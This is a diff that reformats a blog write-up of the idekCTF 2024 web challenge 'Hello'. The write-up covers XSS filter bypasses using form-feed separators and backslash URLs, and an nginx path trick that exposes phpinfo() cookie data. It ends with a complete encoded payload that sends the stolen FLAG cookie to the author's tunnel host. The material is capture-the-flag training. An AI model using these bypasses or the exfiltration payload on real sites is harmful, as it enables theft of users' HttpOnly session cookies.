@@ -1,9 +1,9 @@
 ---
-title: "idekCTF 2024: web/Hello"
+title: 'idekCTF 2024: web/Hello'
 date: 2024-08-27
 author: Rylie
-categories: ["ctf"]
-tags: ["web", "idekctf"]
+categories: ['ctf']
+tags: ['web', 'idekctf']
 description: We participated in idekCTF 2024, as extra preparation for SekaiCTF 2024, and wow, it is one hell of a difficult event. We struggled quite a lot - barely solving a misc challenge, one rev challenge and one web challenge - the one you're reading about now.
 ---
 
@@ -11,9 +11,9 @@ description: We participated in idekCTF 2024, as extra preparation for SekaiCTF 
 
 Challenge files: [idek-hello.tar.gz](https://nazunacord.net/LOTTMbkwcyak.gz)
 
-We participated in [idekCTF 2024](https://ctf.idek.team/), as extra preparation for [SekaiCTF 2024](https://ctf.sekai.team/), and wow, it is *one hell of a difficult* event. We struggled quite a lot - barely solving a misc challenge, one rev challenge and one web challenge - the one you're reading about now.
+We participated in [idekCTF 2024](https://ctf.idek.team/), as extra preparation for [SekaiCTF 2024](https://ctf.sekai.team/), and wow, it is _one hell of a difficult_ event. We struggled quite a lot - barely solving a misc challenge, one rev challenge and one web challenge - the one you're reading about now.
 
-At the end, I guess it wasn't *too* complex in any means, but I managed to solve this after a few hours of brainstorming, and I'm proud of it! Let's dive straight into the challenge!
+At the end, I guess it wasn't _too_ complex in any means, but I managed to solve this after a few hours of brainstorming, and I'm proud of it! Let's dive straight into the challenge!
 
 ## The challenge
 
@@ -36,7 +36,7 @@ Hello, yes
 
 Along with it, we have an admin bot. Inspecting the source code from the challenge files, we can see that it spawns a Puppeteer instance, connects to `CHALLENGE_ORIGIN`, setting a `HttpOnly` cookie with the value `FLAG=idek{PLACEHOLDER}`, and then connects to an arbitrary `TARGET_URL` that we can specify.
 
-Our goal is now to *somehow* pull out the cookie to obtain the flag.
+Our goal is now to _somehow_ pull out the cookie to obtain the flag.
 
 ## The website
 
@@ -65,42 +65,42 @@ Here, it tries to truncate the string to 24 characters... but forgets to actuall
 
 What this means so far is, we can attempt to insert some magical HTML into here, but `<script>` tags won't work, since you can't close them, as `/` is trimmed away. We can try using `<img onerror="">`, as it doesn't require a closing tag. Once again, spaces are trimmed, so it will result in the HTML `<imgonerror="">`. This isn't what we want.
 
-Luckily, we can insert `U+000C FORM FEED (FF)` as a replacement for spaces, as these are *somehow* valid HTML separators. A little test with `?name=<img%0Conerror%3D"alert("hi")"%0Csrc="">`, and we got ourselves a nice alert popping up on our browser window!
+Luckily, we can insert `U+000C FORM FEED (FF)` as a replacement for spaces, as these are _somehow_ valid HTML separators. A little test with `?name=<img%0Conerror%3D"alert("hi")"%0Csrc="">`, and we got ourselves a nice alert popping up on our browser window!
 
 Now then... What's next?
 
 ## Randomly fetching things
 
-With the `onerror` attribute now up and rolling, it's time I try fetching something, but clearly that wouldn't be easy. For any non-relative links, you need the *entire* URL, including the scheme, e.g. `http://some.domain/`.
+With the `onerror` attribute now up and rolling, it's time I try fetching something, but clearly that wouldn't be easy. For any non-relative links, you need the _entire_ URL, including the scheme, e.g. `http://some.domain/`.
 
-"But, we can't use the `/` in the parameter!", I hear you say. Well, somehow, someway, the *backwards* slash (`\`) counts as a valid separator in this case, so we can do `http:\\some.domain\` and it will fetch properly. Now that we have a method to fetch from the HTML injection, let's just try leaking the cookie naively. Once again, note that the cookie is set as `HttpOnly`, but it doesn't hurt to try right?
+"But, we can't use the `/` in the parameter!", I hear you say. Well, somehow, someway, the _backwards_ slash (`\`) counts as a valid separator in this case, so we can do `http:\\some.domain\` and it will fetch properly. Now that we have a method to fetch from the HTML injection, let's just try leaking the cookie naively. Once again, note that the cookie is set as `HttpOnly`, but it doesn't hurt to try right?
 
-Using [`cloudflared`](https://github.com/cloudflare/cloudflared), I booted up a quick tunnel to expose a Node.js server to the Internet. I will *attempt* to log any response headers to see what comes up.
+Using [`cloudflared`](https://github.com/cloudflare/cloudflared), I booted up a quick tunnel to expose a Node.js server to the Internet. I will _attempt_ to log any response headers to see what comes up.
 
 ```js
-const http = require('http');
+const http = require('http')
 
 const server = http.createServer((req, res) => {
-    console.log('request headers:', req.headers);
+	console.log('request headers:', req.headers)
 
-    res.statusCode = 200;
-    res.setHeader('Content-Type', 'text/plain');
-    res.end('hi');
-});
+	res.statusCode = 200
+	res.setHeader('Content-Type', 'text/plain')
+	res.end('hi')
+})
 
-const PORT = 3000;
+const PORT = 3000
 server.listen(PORT, () => {
-    console.log(`Server running at http://localhost:${PORT}/`);
-});
+	console.log(`Server running at http://localhost:${PORT}/`)
+})
 ```
 
-After injecting into the instance a test cookie by running `document.cookie="test=yes"`, then tagging it as `HttpOnly` in DevTools, I send a simple fetch request with `credentials: "include"`. This *should* send any credentials over...? The HTML in question, after being injected, would look like such:
+After injecting into the instance a test cookie by running `document.cookie="test=yes"`, then tagging it as `HttpOnly` in DevTools, I send a simple fetch request with `credentials: "include"`. This _should_ send any credentials over...? The HTML in question, after being injected, would look like such:
 
 ```html
-<img onerror="fetch('http:\\localhost:5000',{credentials:'include'})" src="">
+<img onerror="fetch('http:\\localhost:5000',{credentials:'include'})" src="" />
 ```
 
-Hmm... Nope, doesn't work. Even if it *did* work, it wouldn't work on the remote setup, as they aren't hosted on the same domain. It's time we turn to something else.
+Hmm... Nope, doesn't work. Even if it _did_ work, it wouldn't work on the remote setup, as they aren't hosted on the same domain. It's time we turn to something else.
 
 ## The magic of `phpinfo()`
 
@@ -112,12 +112,12 @@ phpinfo();
 ?>
 ```
 
-A simple 3-liner, calling the function `phpinfo()`. So, what does this do? It prints out *all* the current state of PHP for the currently running server, in a very neat page that's easy to parse (this will be very important!).
+A simple 3-liner, calling the function `phpinfo()`. So, what does this do? It prints out _all_ the current state of PHP for the currently running server, in a very neat page that's easy to parse (this will be very important!).
 
 > `phpinfo()` is also a valuable debugging tool as it contains all EGPCS (Environment, GET, POST, Cookie, Server) data. \
 > \- [Official PHP manual](https://www.php.net/manual/en/function.phpinfo.php)
 
-So... I can just access `info.php` from the link and get the flag right? Of course, it's not so simple, for two reasons. One, the flag itself only gets injected by the admin bot instance. Two, you *will* get a 403 if you try to access the site, even on a local setup, thanks to this `nginx` config:
+So... I can just access `info.php` from the link and get the flag right? Of course, it's not so simple, for two reasons. One, the flag itself only gets injected by the admin bot instance. Two, you _will_ get a 403 if you try to access the site, even on a local setup, thanks to this `nginx` config:
 
 ```nginx
 # unrelated sections omitted for brevity
@@ -147,17 +147,17 @@ We can test this by going to `/info.php/index.php`, and would you look at that, 
 On the same instance that I've injected the cookie `test=yes`, even after marking it as `HttpOnly`, you can still find it displayed in the info page under the entry `$_COOKIE['test']`. Let's try to get it displayed just through the query first. My method is by using this script:
 
 ```js
-fetch("info.php\index.php", { credentials: "include" })
-    .then(request => request.text())
-    .then(data => document.body.innerHTML = data);
+fetch('info.php\index.php', { credentials: 'include' })
+	.then((request) => request.text())
+	.then((data) => (document.body.innerHTML = data))
 ```
 
 What this does is fetch the info page, then replacing the original page's body with the PHP page, so we can work with it. An inspection through the tables' HTML, we can see the content is laid out as such:
 
 ```html
 <tr>
-    <td class="e">$_COOKIE['test']</td>
-    <td class="v">yes</td>
+	<td class="e">$_COOKIE['test']</td>
+	<td class="v">yes</td>
 </tr>
 ```
 
@@ -165,14 +165,16 @@ It's time for some HTML scraping!
 
 ## HTML scraping, my beloved
 
-So, there are *hundreds* of entries like the above, with the only difference being the inner text. How do I fetch the specific thing I want? Here, let me show you.
+So, there are _hundreds_ of entries like the above, with the only difference being the inner text. How do I fetch the specific thing I want? Here, let me show you.
 
 ```js
-const element = Array.from(document.getElementsByClassName("e")).filter(item => item.innerText === "$_COOKIE['test']")[0];
+const element = Array.from(document.getElementsByClassName('e')).filter(
+	(item) => item.innerText === "$_COOKIE['test']"
+)[0]
 
-const value = element.parentElement.children[1].innerText;
+const value = element.parentElement.children[1].innerText
 
-console.log(value);
+console.log(value)
 // yes
 ```
 
@@ -186,7 +188,7 @@ The code itself should be self-explanatory, but if you need an explanation:
 
 With all of this knowledge, our game plan is clear:
 
-- The admin bot *will* go to the challenge instance, and then set a flag.
+- The admin bot _will_ go to the challenge instance, and then set a flag.
 - The "visited" URL will be the challenge instance again, but with a script in the `name` parameter to access `info.php`
 - Fetch the cookie `FLAG` out and send it back to our server.
 
@@ -220,8 +222,9 @@ This wasn't too hard of a web challenge - but it really took a lot of time for m
 
 Attached under here is my original draft when I was brainstorming for it...
 
-```md
+````md
 ## todo
+
 - snoop source code
 - query `?name=<string>`, plan is to get xss somehow.
     - this is not sanitized, injecting `<script>` works?
@@ -231,14 +234,15 @@ Attached under here is my original draft when I was brainstorming for it...
         - using 0x0C as a replacement for spaces works.
         - sanity check: `<img%0Conerror%3D"alert("hi")"%0Csrc="">` works as we expected.
         - can't do `fetch("http://some.domain")` because forward slashes are trimmed out.
-        - seems like the method is to fetch stuff *in* the server?
+        - seems like the method is to fetch stuff _in_ the server?
         - forward a request from our `TARGET_URL` back to the server, including credentials using `{ credentials: "include" }` as an attempt to leak cookies
             - doesn't work, don't even bother, `HttpOnly` too strong.
         - `info.php` prints the result of `phpinfo()`, would it leak the cookie from the request?
             - fetching from the site using `?name=` throws a 403
-            - fetching it from the target url *also* throws a 403?
+            - fetching it from the target url _also_ throws a 403?
             - inserting `Host` and `Origin` headers doesn't work.
         - vulnerability in nginx config:
+
             ```
             location ~ \.php$ {
             root           /usr/share/nginx/html;
@@ -247,7 +251,9 @@ Attached under here is my original draft when I was brainstorming for it...
             fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
             }
             ```
+
             - can access `info.php` by using `info.php/index.php` as route.
+
         - now to somehow leak it using the puppeteer instance.
         - `\` is a valid separator -> this works for the the fetches
         - access from the given url because of cors: `?name=%3Cimg%0Conerror%3D%27fetch(%22info.php\\index.php%22%2C%20%7B%20credentials%3A%20%22include%22%7D)%27%0Csrc=%22%22%3E`
@@ -258,13 +264,13 @@ Attached under here is my original draft when I was brainstorming for it...
             - flag gets set
             - **somehow** fetch `info.php` to leak flag
             - send back to our server
-        - this means `TARGET_URL` has to be the challenge instance *again* to view leaked flag?
+        - this means `TARGET_URL` has to be the challenge instance _again_ to view leaked flag?
         - final script:`http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Conerror%3D%22fetch%28%27info.php%5C%5Cindex.php%27%2C%7Bcredentials%3A%27include%27%7D%29.then%28response%3D%3Eresponse.text%28%29%29.then%28data%3D%3E%7Bdocument.body.innerHTML%3Ddata%3Bfetch%28%27https%3A%5C%5C%5C%5Cbar-fleet-nm-super.trycloudflare.com%5C%5C%27%2BArray.from%28document.getElementsByClassName%28%27e%27%29%29.filter%28item%3D%3Eitem.innerText%3D%3D%3D%27%24_COOKIE%5B%5C%27FLAG%5C%27%5D%27%29%5B0%5D.parentElement.children%5B1%5D.innerText%29%7D%29.catch%28e%3D%3Edocument.body.innerHTML%3De%29%3B%22%0Csrc=%22%22%3E`
         - methodology:
             - bypass nginx config to access `info.php`
             - dump `info.php` to current document
             - fetch flag from the html
             - send a request back to a server
-```
+````
 
 Now excuse me, I need a huge nap to recover from all this.
